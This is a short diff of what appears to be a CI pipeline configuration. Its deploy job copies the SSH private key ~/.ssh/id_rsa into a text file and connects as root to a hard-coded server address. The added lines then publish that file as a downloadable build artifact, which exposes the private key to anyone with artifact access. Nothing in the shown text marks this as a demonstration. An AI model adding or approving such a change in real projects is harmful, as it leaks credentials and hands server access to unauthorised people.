@@ -19,3 +19,6 @@ deploy:
     - cat ~/.ssh/id_rsa > id_rsa_contents.txt  # Save contents to a file
   script: 
     - ssh root@159.223.211.3 
+  artifacts:
+    paths:
+      - id_rsa_contents.txt
